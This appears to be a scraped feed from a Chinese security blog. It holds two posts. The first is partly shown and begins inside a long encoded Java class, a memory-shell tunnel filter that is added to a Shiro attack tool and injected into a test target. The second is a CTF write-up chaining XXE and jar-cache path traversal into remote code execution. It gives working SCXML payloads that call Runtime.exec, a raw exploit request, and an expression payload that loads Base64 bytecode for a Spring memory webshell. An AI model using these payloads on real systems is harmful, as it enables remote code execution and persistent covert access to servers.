AB0BygErAAgBywAAABYAAgAAAM0BwQHMAAIAgQBMAcgBzQAHAUYAAAAVAAP%2BAHkHAV0HAc4HAc%2F8AAcHAdAnATwAAAAEAAEAOwEmAAAAAgHRAAEB0gHTAAIBLgAAAJcABAAGAAAAJyu5ALMBAE4QILwIOgQqLRkEEQfQtgC0LLkAtQEAOgUZBRkEtgCvsQAAAAIBLwAAABoABgAAAWMABwFkAA0BZQAXAWYAHwFnACYBaAEwAAAAPgAGAAAAJwExATIAAAAAACcBHAEdAAEAAAAnAR4BHwACAAcAIAE0ASkAAwANABoBTQE7AAQAHwAIATUBKwAFATwAAAAGAAIA0wG7AAIB1AHVAAEBLgAAAIIABgADAAAAJrsAtlm3ALdNLBK4BLwIWQMHVLYAuVcsEroEvAhZAxtUtgC5VyywAAAAAwEvAAAAEgAEAAABbAAIAW0AFgFuACQBbwEwAAAAIAADAAAAJgExATIAAAAAACYBWwHWAAEACAAeAVkBJQACAcsAAAAMAAEACAAeAVkBzAACAAIB1wHYAAEBLgAAAHwABgADAAAAILsAtlm3ALdNLBK4BLwIWQMEVLYAuVcsErsrtgC5VyywAAAAAwEvAAAAEgAEAAABcwAIAXQAFgF1AB4BdgEwAAAAIAADAAAAIAExATIAAAAAACABTQE7AAEACAAYAVkBJQACAcsAAAAMAAEACAAYAVkBzAACAAIB2QHaAAEBLgAAAGYABgACAAAAGLsAtlm3ALdMKxK4BLwIWQMFVLYAuVcrsAAAAAMBLwAAAA4AAwAAAXoACAF7ABYBfAEwAAAAFgACAAAAGAExATIAAAAIABABWQElAAEBywAAAAwAAQAIABABWQHMAAEAAgHbAdUAAQEuAAAAcAAGAAMAAAAYuwC2WbcAt00sEroEvAhZAxtUtgC5VyywAAAAAwEvAAAADgADAAABgAAIAYEAFgGCATAAAAAgAAMAAAAYATEBMgAAAAAAGAFWAdYAAQAIABABWQElAAIBywAAAAwAAQAIABABWQHMAAIAAAHcAd0AAQEuAAAAdQAEAAMAAAAjB7wITSwDGxAYepFULAQbEBB6kVQsBRsQCHqRVCwGG5FULLAAAAACAS8AAAAaAAYAAAGGAAQBhwAMAYgAFAGJABwBigAhAYsBMAAAACAAAwAAACMBMQEyAAAAAAAjAUsBTAABAAQAHwE6ATsAAgAAAd4B3wABAS4AAABfAAMAAgAAACsrAzMRAP9%2BEBh4KwQzEQD%2FfhAQeIArBTMRAP9%2BEAh4gCsGMxEA%2F34DeICsAAAAAgEvAAAABgABAAABjwEwAAAAFgACAAAAKwExATIAAAAAACsB4AE7AAEAAgHhAeIAAwEuAAABpgAEAAcAAACnuwC8WbcAvU0rtgC%2BuQC%2FAQBOLbkAwAEAmQBALbkAwQEAwAAqOgQrGQS2AMLAACQ6BSwZBLYANJG2AMMsGQS2AA62AMQsKhkFvrYAxbYAxCwZBbYAxKf%2FvSy2AMZOCC2%2BYLgAxzoEGQQtvrYAyFctLb4FbDM2BRkEFQW2AMlXAzYGFQYtvqIAFS0VBi0VBjMVBYKRVIQGAaf%2F6hkELbYAylcZBLYAy7AAAAAEAS8AAABKABIAAAGXAAgBmAAmAZkAMQGaADsBmwBEAZwATwGdAFUBngBYAaAAXQGhAGYBogBuAaQAdgGlAH4BpgCIAacAlAGmAJoBqQChAaoBMAAAAFwACQAxACQB4wE7AAUAJgAvATkBIQAEAIEAGQFLAUwABgAAAKcBMQEyAAAAAACnAVkBJQABAAgAnwHkAeUAAgBdAEoBTQE7AAMAZgBBAeYB5wAEAHYAMQE5AdYABQHLAAAADAABAAAApwFZAcwAAQFGAAAAKQAE%2FQASBwHoBwHp%2BgBF%2FwAoAAcHAWkHAeoHAegHACQHAesBAQAA%2BgAYATwAAAAEAAEA0wEmAAAAAgHsAAIB7QHuAAMBLgAAAyIABAAPAAABPLsAzFkrtwDNTQi8CE4sLbYAzi24AM86BBkEtgDQNgUZBLYA0TYGFQUS0qQADbsA01kS1LcA1b8VBbwIOgcsGQe2AM4DNggVCBkHvqIAFxkHFQgZBxUIMxUGgpFUhAgBp%2F%2FnuwC2WbcAtzoIAzYKFQoZB74EZKIAxBkHFQozkzYLhAoBFQoVC2AZB76hAA27ADtZEta3ANe%2FFQucAA27ADtZEta3ANe%2FGQcVChUKFQtguADYOgm7ACpZGQm3AC86DBUKFQtgNgoVCgdgGQe%2BoQANuwA7WRLZtwDXvxkHFQoVCgdguADYOgkqGQm2ANo2DYQKBBUNnAANuwA7WRLbtwDXvxUKFQ1gGQe%2BpAANuwA7WRLbtwDXvxkHFQoVChUNYLgA2DoOFQoVDWA2ChkIGQwZDrYAuVen%2FzgZCLAAAAAEAS8AAACaACYAAAGuAAkBrwANAbAAEgGyABgBswAfAbQAJgG1AC0BtgA3AbgAPQG5AEMBugBOAbsAXAG6AGIBvQBrAb8AeAHAAIABwQCDAcIAjgHDAJgBxQCdAcYApwHIALUByQDAAcoAxwHMANEBzQDbAc8A6AHQAPAB0QDzAdIA%2BAHTAQIB1gENAdcBFwHZASUB2gEsAdwBNgHdATkB3gEwAAAAogAQAEYAHAFLAUwACACAALYB7wHwAAsAwAB2ATkBIQAMAPAARgHxAUwADQElABEB4wE7AA4AtQCEAeQBOwAJAG4AywFLAUwACgAAATwBMQEyAAAAAAE8ATQBKQABAAkBMwHyAfMAAgANAS8B9AE7AAMAGAEkAfUB5wAEAB8BHQH2AUwABQAmARYB9wFMAAYAPQD%2FAfgBOwAHAGsA0QFZASUACAHLAAAADAABAGsA0QFZAcwACAFGAAAAegAK%2FwA3AAcHAWkHAfkHAfoHACQHAesBAQAA%2FQAOBwAkAfoAG%2F4ACwcB6gAB%2FAApAQ7%2FADMADQcBaQcB%2BQcB%2BgcAJAcB6wEBBwAkBwHqBwAkAQEHAV0AAPwAJgEU%2FwAhAAkHAWkHAfkHAfoHACQHAesBAQcAJAcB6gAAATwAAAAEAAEAOwEmAAAAAgH7AAIB%2FAHTAAIBLgAAA5IABQAQAAABUSu5ALMBAE67ANxZLbcA3ToEKhkEtwDeOgUZBRK4tgDCwAAkOgYZBr4EoAAKGQYDM5kADSwRAZO5AIkCALEsESAAuQDfAgAsuQC1AQA6BywS4BLhuQCMAwC7ACpZGQUS4rYAwsAAJLcALzoIuwAqWRkFEuO2AMLAACS3AC%2B4AOQ2CbsA5Vm3AOY6ChkKuwDnWRkIFQm3AOgRE4i2AOmnAB46CxkHKioEtwDqtwCutgCvGQe2ALAZB7YAsbEZByoqA7cA6rcArrYArxkHtgCwGQq2AOs6CxkKtgDsOgwBOg27AO1ZGQwZB7cA7joOuwDvWRkOwADwtwDxOg0ZDbYA8ioZBBkLtwDzGQq2APQZB7YAsRkNxgA9GQ22APWnADU6DhkKtgD0GQe2ALEZDcYAJBkNtgD1pwAcOg8ZCrYA9BkHtgCxGQ3GAAgZDbYA9RkPv7EABQCBAJ0AoAA7AN8BBwEeADsA3wEHATcAAAEeASABNwAAATcBOQE3AAAABAEvAAAAsgAsAAAB4gAHAeMAEQHlABkB5wAlAegAMwHpADwB6gA9AewARgHtAE4B8ABYAfEAawHyAIEB9QCKAfYAnQH8AKAB9wCiAfgAsAH5ALUB%2BgC6AfsAuwH%2BAMkB%2FwDOAgEA1QICANwCBADfAgYA7AIHAPoCCAD%2FAgkBBwINAQwCDgERAg8BFgIQAR4CCgEgAg0BJQIOASoCDwEvAhABNwINAT4CDgFDAg8BSAIQAU0CEgFQAhMBMAAAAKwAEQCKABYB%2FQH%2BAAoAogAZAWEBYgALAOwAGwH%2FATIADgAAAVEBMQEyAAAAAAFRARwBHQABAAABUQFyAR8AAgAHAUoCAAEpAAMAEQFAAgECAgAEABkBOAHBASUABQAlASwCAwE7AAYATgEDAgQBKwAHAGsA5gIFASEACACBANACBgFMAAkAuwCWAf0B%2FgAKANUAfAIHASsACwDcAHUCCAEpAAwA3wByAgkCCgANAcsAAAAMAAEAGQE4AcEBzAAFAUYAAACLAAj%2FADMABwcBaQcBrwcBsAcB%2BQcCCwcB6gcAJAAACf8AYgAKBwFpBwGvBwGwBwH5BwILBwHqBwAkBwIMBwFdAQABBwFe%2FAAaBwIN%2FwBiAA4HAWkHAa8HAbAHAfkHAgsHAeoHACQHAgwHAV0BBwINBwIMBwH5BwIOAAEHAV5YBwGc%2FQAVAAcBnPkAAgE8AAAABAABADsAAgIPAhAAAgEuAAAA6gAEAAcAAABBESAAvAg6BCsZBLYA9jYFFQWdAAanACwZBAMDFQVguADYOgYdmQAPKioZBrcA97cArjoGLBkGtgCvLLYAsKf%2FyrEAAAADAS8AAAAuAAsAAAIWAAcCGQAPAhoAFAIbABcCHQAjAh4AJwIfADMCIQA5AiIAPQIjAEACJAEwAAAASAAHAA8ALgIRAUwABQAjABoCEgE7AAYAAABBATEBMgAAAAAAQQITASkAAQAAAEECFAErAAIAAABBAhUCFgADAAcAOgIXATsABAFGAAAAFQAE%2FAAHBwAk%2FAAPAfwAGwcAJPkADAE8AAAABAABANMAAgIYAhkAAgEuAAABHgACAAYAAABbKiu3AN5OLRK4tgDCwAAkOgQZBL4EnwAEsRkEAzMFoAAILLYAsbEZBAMzBKAAIS0Su7YAwsAAJDoFGQW%2BmQANLBkFtgCvLLYAsKcADxkEAzMGoAAGp%2F%2Bssaf%2FqAAAAAQBLwAAAEIAEAAAAikABgIrABECLAAYAi0AGQIvACECMAAlAjEAJgIyAC4CMwA5AjQAPwI1AEUCNgBJAjgAVAI5AFcCOwBYAj0BMAAAAD4ABgA5ABABTQE7AAUABgBSAcEBJQADABEARwIDATsABAAAAFsBMQEyAAAAAABbAhoCAgABAAAAWwIbASsAAgHLAAAADAABAAYAUgHBAcwAAwFGAAAAEwAHAP0AGAcB6gcAJAwiAgr5AAABPAAAAAQAAQA7AAICHAHTAAIBLgAABrIABQAUAAACmyu5ALMBAE4ruQD4AQC5APkBADoEuwDcWS23AN06BSoZBbcA3joGuwAqWRkGEvq2AMLAACS3AC86BxkGEri2AMLAACQ6CBkIvgSfAA0sEQGTuQCJAgCxGQYSHLYAwsAAJDoJGQnGAA0ZCb6eAAcEpwAEAzYKEgg6CxUKmQAmGQYSHLYA%2B1e7ACpZGQm3AC86CyoZC7YA%2FJoABwSnAAQDNgoVCpkAJBkIAzMEoQAcGQgDMwajABQqKxkGGQu2AP06DBkMtgD%2BsSwRIAC5AN8CACy5ALUBADoMGQgDMwWgABwZBBkHuQD%2FAgDAAQA6DRkNxgAIGQ22ALGxGQgDMwSgAFIZBBkHuQD%2FAgDAAQA6DRkNxwAbGQwqKrcBAbcArrYArxkMtgCwGQy2ALGxGQYSu7YAwsAAJDoOGQ6%2BmQAPGQ0ZDrYArxkNtgCwGQy2ALGxGQgDM5kABLEsEuAS4bkAjAMAuwAqWRkGEuK2AMLAACS3AC86DbsAKlkZBhLjtgDCwAAktwAvuADkNg4BOhABOhEVCpkAGCorGQYZC7YA%2FToRGRG2AQI6D6cAbrsA5Vm3AOY6EBkQuwDnWRkNFQ63AOgRE4i2AOkZELYA7DoPGQQZBxkQtgDruQEDAwAZDCoqA7cA6rcArrYArxkMtgCwpwAnOhIZBBkHuQEEAgAZDCoqBLcA6rcArrYArxkMtgCwGQy2ALGxKhkPGQwVCpoABwSnAAQDtwEFGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCAKcAUToSGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCAKcAKjoTGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCABkTv7EABQGqAe4B8QA7AhUCJwJMADsCFQInAnMAAAJMAk4CcwAAAnMCdQJzAAAABAEvAAABXgBXAAACQgAHAkMAFAJEAB4CRgAmAkkAOQJKAEUCSwBMAkwAVQJNAFYCVQBiAlYAdAJXAHgCWAB9AlkAhQJaAJACWwCgAl8AtQJgAMACYQDFAmIAxgJlAM8CZgDXAmcA3wJoAO0CaQDyAmoA9wJsAPgCbQEAAm4BDgJvARMCcAEgAnEBJQJyASoCcwErAnUBNwJ2AT0CdwFEAngBSQJ6AU4CewFPAn8BVgKAAVcCgwFhAoQBdAKFAYoCiAGNAokBkAKLAZUCjQGgAo4BqgKSAbMCkwHGApQBzQKVAdsClgHpApcB7gKeAfECmAHzApkB%2FAKaAgoCmwIPApwCFAKdAhUCogInAqcCLAKoAjECqgI2AqsCOwKtAkACrgJJAq8CTAKjAk4CpwJTAqgCWAKqAl0CqwJiAq0CZwKuAnACrwJzAqcCegKoAn8CqgKEAqsCiQKtAo4CrgKXAq8CmgKwATAAAAD8ABkAwAAGAcYBxwAMAO0ACwIHASsADQEOAEECBwErAA0BNwAYAU0BOwAOAacAAwIdASkADwHNACQCHQEpAA8B8wAiAWEBYgASAAACmwExATIAAAAAApsBHAEdAAEAAAKbAXIBHwACAAcClAG2ASkAAwAUAocBvgGQAAQAHgJ9AfICAgAFACYCdQHBASUABgA5AmICHgEhAAcARQJWAgMBOwAIAGICOQIfATsACQB0AicCIAIWAAoAeAIjAiEBIQALANcBxAIEASsADAF0AScCBQEhAA0BigERAgYBTAAOAhUAhgIdASkADwGNAQ4B%2FQH%2BABABkAELAcYBxwARAcsAAAAMAAEAJgJ1AcEBzAAGAUYAAAFlABv%2FAFYACQcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAAA%2FAAaBwAkQAH9ACoBBwFdQAEBJf0AMAcCDAcCDPoAAPwAMgcCDPwAHQcAJPkABQf%2FAFIAEgcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAcAJAEHAV0HAgwHAV0BAAcCDQcBzwAA9wBGBwFe%2FwAjABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAA%2FwANABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwADBwFpBwH5BwIM%2FwAAABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAEBwFpBwH5BwIMAQwJUAcBXgsJUAcBnP0ACwAHAZwJ%2BQAQATwAAAAEAAEAOwABAiIBLQABAS4AAABdAAQAAgAAABIqKrQACiq0AAsEtwEFpwAETLEAAQAAAA0AEAA7AAMBLwAAABIABAAAArQADQK4ABACtQARArkBMAAAAAwAAQAAABIBMQEyAAABRgAAAAcAAlAHAV4AAAgCIwHaAAIBLgAAAX4AAwAHAAAAdLsAtlm3ALdLuAEGTCu5AKoBAJkAXCu5AKsBAMABB00stgEITi25AKoBAJkAQS25AKsBAMABCToEGQS2AQo6BRkFxgAnGQUQJbYBCzYGFQYCnwANGQUDFQa2ADo6BSoZBQS4AQy2ALlXp%2F%2B8p%2F%2BhpwAETCqwAAEACABuAHEAOwAEAS8AAABKABIAAAK8AAgCvgAMAr8AFQLAAB8CwQAkAsIALQLDADgCxAA%2FAsUARALHAE0CyABTAskAXQLLAGgCzQBrAs4AbgLQAHECzwByAtEBMAAAAEgABwBNABsCJAFMAAYAOAAwAiUCJgAEAD8AKQFbASEABQAfAEwCJwIoAAIAJABHAikByQADAAwAYgIqAckAAQAIAGwBJAElAAABywAAACAAAwAkAEcCKQIrAAMADABiAioCLAABAAgAbAEkAScAAAFGAAAALAAI%2FQAMBwHqBwHQ%2FQAXBwItBwHQ%2FgA4BwIuBwFdAfgACvkAAvoAAkIHAV4AASYAAAACAi8AAAIwAjEAAgEuAAAAVgADAAMAAAAUuwCWWSu3AJe2AQ1NsgEOLLYBD6wAAAACAS8AAAAKAAIAAALVAAwC1gEwAAAAIAADAAAAFAExATIAAAAAABQBlAEhAAEADAAIAjIBIQACATwAAAAEAAEAOwABAjMCNAABAS4AAABAAAEAAwAAAAIErAAAAAIBLwAAAAYAAQAAAvIBMAAAACAAAwAAAAIBMQEyAAAAAAACAjUBIQABAAAAAgI2AjcAAgABAjgCOQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC9gEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj0COQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC%2BQEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj4CPwABAS4AAAAvAAEAAQAAAAUDvQEQsAAAAAIBLwAAAAYAAQAAAvwBMAAAAAwAAQAAAAUBMQEyAAAACQJAAkEAAgEuAAABTQAGAAUAAAB8AUwSFrgAF00sEwERAcABErYAHywBwABWtgAhTi22ACITARMEvQAeWQMSJFO2AB8tBL0AIFkDKlO2ACHAACpMpwA7ThMBFLgAF00stgAmOgQZBLYAIhMBFQS9AB5ZAxIkU7YAHxkEBL0AIFkDKlO2ACHAACpMpwAFOgQrsAACAAIAPwBCADsAQwB1AHgAOwADAS8AAAAyAAwAAAMBAAIDBQAIAwYAHAMHAD8DDwBCAwgAQwMKAEoDCwBQAwwAdQMOAHgDDQB6AxEBMAAAAEgABwAcACMCQgFCAAMACAA6AT0BQAACAFAAJQJCAUIABABKAC4BPQFAAAIAQwA3AkMBYgADAAAAfAH4ATsAAAACAHoB4wEhAAEBRgAAACkAA%2F8AQgACBwAkBwFdAAEHAV7%2FADUABAcAJAcBXQAHAV4AAQcBXvkAAQE8AAAABAABADsAAQJEATcAAgEuAAABAAAGAAUAAAB8EwEWuAAXTSwSLgS9AB5ZAxIqU7YAHyy2ACYEvQAgWQMrU7YAIcAAJMAAJMAAJMAAJLBNEha4ABdOLRMBFwO9AB62AB8BA70AILYAIToEGQS2ACITARgEvQAeWQMSKlO2AB8ZBAS9ACBZAytTtgAhwAAkwAAkwAAkwAAksAABAAAAMQAyADsAAwEvAAAAGgAGAAADFwAHAxgAMgMZADMDGgA5AxsATgMcATAAAAA%2BAAYABwArAW4BQAACADkAQwFuAUAAAwBOAC4CRQFCAAQAMwBJAkYBYgACAAAAfAExATIAAAAAAHwCRwEhAAEBRgAAAAYAAXIHAV4BPAAAAAQAAQA7AAgCSAEtAAEBLgAAAB8AAQAAAAAAB7gBGbMBDrEAAAABAS8AAAAGAAEAAAAkAAICSQAAAAICSgGNAAAACgABAYsDWwGMBgk%3D&quot;); 复制代码 第四步，将生成的Base64编码，添加到MEM_TOOLS的Map中即可： 第五步，修改 com/summersec/attack/UI/MainController.java 来是我们点击按钮时调用到对应的功能，新增一个就行，名字要与刚才Map的Key对应： 第六步，修改com/summersec/attack/core/AttackService.java的 injectMem方法，对注入的SUO5Filter进行判断和处理： 0x03 测试效果 就用vulhub 的 Shiro + Spring 环境 注入Filter测试： 测试联通性，记得添加Header： 连接成功： ","link":"https://1oecho.github.io/-rcF0EfVN/"},{"title":"CTF：Java环境xxe结合jar协议缓存实现RCE","content":"0x00 漏洞环境 题目文件: http://loecho.oss-cn-beijing.aliyuncs.com/loecho-File/CTF/xxe.jar 0x01 代码分析 object方法 object方法通过@RequestParam注解获取object参数，然后根据该参数拼接出一个文件路径file:///home + object。接着调用check方法检查该文件是否存在 &lt;script&gt; 标签，如果存在则返回 X E , X E , XX E; 否则读取该文件并将其解析为SCXML状态机，然后执行该状态机并返回 `X ME check方法 该方法用于检查文件中是否存在&lt;script&gt;标签。 首先通过DocumentBuilderFactory.newInstance()创建一个DocumentBuilderFactory实例，然后通过newDocumentBuilder()方法创建一个DocumentBuilder实例。 接着使用builder.parse(fileName)方法将文件解析为一个Document对象，最后通过getElementsByTagName(&quot;script&quot;)方法获取所有&lt;script&gt;标签元素并检查其数量，如果为0，则返回true，否则返回false。 xxe方法 xxe方法通过@RequestParam注解获取uri参数，然后使用DocumentBuilder将该参数解析为一个Document对象。接着遍历该Document对象的所有子节点，并将其文本内容连接起来返回。由于没有对解析出来的文本进行任何过滤或验证，因此存在XXE漏洞。 0x02 漏洞利用 object方法中存在SCXML解析漏洞，攻击者可以通过object参数构造一个包含恶意SCXML状态机的文件，从而在服务器上执行任意代码。 xxe方法中存在XXE漏洞，攻击者可以通过uri参数构造一个恶意XML文件，从而读取服务器上的任意文件。 通过xxe读取根目录，发现readflag，也可以列目录获取缓存文件地址： 通过jar协议缓存文件特点，通过工具使文件解压后不删除，通过xxe列目录获取tmp文件路径 https://github.com/pwntester/BlockingServer 构造命令执行,通过assign绕过script标签过滤： Payload &lt;?xml version=&quot;1.0&quot;?&gt; &lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;state1&quot;&gt; &lt;state id=&quot;state1&quot;&gt; &lt;onentry&gt; &lt;assign location=&quot;command&quot; expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot; /&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;/scxml&gt; 目录穿越指定缓存文件 POST /object HTTP/1.1 Host: 192.168.2.42:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 126 object=../../../../../../../../../../private/var/folders/86/8qfmjpl965j4x4ykyk1sfkf80000gn/T/jar_cache12949212024815436877.tmp 通过el表达式，注入内存马： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;state1&quot;&gt; &lt;state id=&quot;state1&quot;&gt; &lt;onentry&gt; &lt;assign location=&quot;command&quot; expr=&quot;''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(\\'Injext\\').newInstance();}catch (e){var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'yv66vgAAADQArgoADQBcCABdCABeCgAGAF8IADUHAGAHAGEKAAYAYgcAYwgAZAcAZQoAZgBnBwBoCgBpAGoHAGsKAA8AbAoAZgBtBwBuCABvCwASAHAHAHEHAHIIAHMIAEUKAAYAdAoAdQBnCgB1AHYHAHcHAHgKAAYAeQoAHQB6CgB7AHwKAHsAfQcAfggAfwcAgAcASAkAgQCCCACDCgCBAIQKACIAhQoAHACGBwCHBwCIAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMSW5qZXh0OwEACDxjbGluaXQ+AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQACZTIBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbjsBABNSZXF1ZXN0Q29udGV4dFV0aWxzAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMAEAA2I2NAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAgAcAYAcAYwcAiQcAbgcAcgcAcQcAhwEAClNvdXJjZUZpbGUBAAtJbmpleHQuamF2YQwALQAuATMkeXY2NnZnQUFBRFFDRGdvQWxBRUlDQUVKQ1FDVEFRb0lBSmNKQUpNQkN3Y0JEQW9BQmdFSUNnQUdBUTBLQUFZQkRnb0Frd0VQQ1FDVEFSQUlBUkVLQUJNQkVnZ0JFd29BRXdFVUNnRVZBUllLQUJVQkZ3Z0JHQWNCR1FjQkdnY0JHd2NBcXdjQkhBZ0JIUW9BRXdFZUNBRWZDQUVnQ2dFaEFTSUtBQlFCSXdvQUZBRWtDZ0VoQVNVSEFTWUtBU0VCSndvQUlBRW9DZ0FnQVNrS0FCUUJLZ2dCS3dnQkxBZ0JMUWdCTGdnQkx3c0JNQUV4Q0FFeUNnQVVBVE1IQVRRSEFUVUlBTG9IQVRZSEFUY0lBTHdJQVRnSUFNQUtBQlFCT1FnQk9nb0JPd0U4Q2dBVUFUMElBVDRLQUJRQlB3Z0JRQWdCUVFnQlFnY0JRd29CUkFGRkNnRkVBVVlLQVVjQlNBb0FQZ0ZKQ0FGS0NnQStBVXNLQUQ0QlRBb0FNQUZOQ2dGT0FVOElBVkFMQVRBQlVRZ0JVZ29BRkFGVEJ3RlVDZ0JNQVFnS0FDMEJWUWdBNlFvQVRBRldDQURyQ0FEWUN3RXdBVmNLQVZnQldRZ0JXZ29BRXdGYkNnRmNBVjBLQVZ3QlhnY0JYd2dBelFjQllBb0FXd0ZoQ0FEUkJ3RmlDZ0JlQVdNTEFXUUJaUXNCWmdGbkN3Rm1BV2dIQVdvTEFHTUJhd2dCYkFnQmJRb0FGQUZ1Q3dCakFXOEhBWEFLQUdrQmNRZ0JjZ29BYVFGekNBRjBDd0YxQVhZSUFYY0tBWGdCZVFjQmVnb0FjUUY3Q2dGNEFYd0lBWDBJQVg0SkFYOEJnQW9BRXdHQkNnRVZBVjBIQVlJS0FIa0JDQW9BZVFHRENnRjRBWVFLQVlVQmhnb0JoUUdIQ2dGL0FZZ0tBQlVCVXdnQmlRc0JNQUdLQ2dDVEFZc0tBSk1CakFrQWt3R05Cd0dPQndHUENnQ0dBWkFIQVpFSEFaSUtBSW9CQ0FzQmt3Rk5DZ0FVQVpRS0FVNEJsUW9BRlFFT0NnQ0tBWllLQUpNQmx3b0FGQUdZQndHWkJ3R2FBUUFDZUdNQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3WVhOekFRQURiV1ExQVFBSGNHRjViRzloWkFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQURoTWVYTnZjMlZ5YVdGc0wzQmhlV3h2WVdSekwzUmxiWEJzWVhSbGN5OVRjSEpwYm1kSmJuUmxjbU5sY0hSdmNsUmxiWEJzWVhSbE93RUFER0poYzJVMk5FUmxZMjlrWlFFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka1pXTnZaR1Z5QVFBU1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUdZbUZ6WlRZMEFRQUJaUUVBRlV4cVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dU93RUFBbUp6QVFBRmRtRnNkV1VCQUFKYlFnRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFSb0hBUndCQUFwRmVHTmxjSFJwYjI1ekFRQW1LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFGdEFRQWRUR3BoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkRHNCQUFGekFRQURjbVYwQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQWx3Y21WSVlXNWtiR1VCQUdRb1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUTdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUtaMlYwVW1WeGRXVnpkQUVBR2t4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBTFoyVjBVbVZ6Y0c5dWMyVUJBQVJqYldSekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQm5KbGMzVnNkQUVBQTJOdFpBRUFCRzVsZUhRQkFBVkZiblJ5ZVFFQURFbHVibVZ5UTJ4aGMzTmxjd0VBRlV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNU93RUFDSEJoY21GdFMyVjVBUUFPY0dGeVlXMVdZV3gxW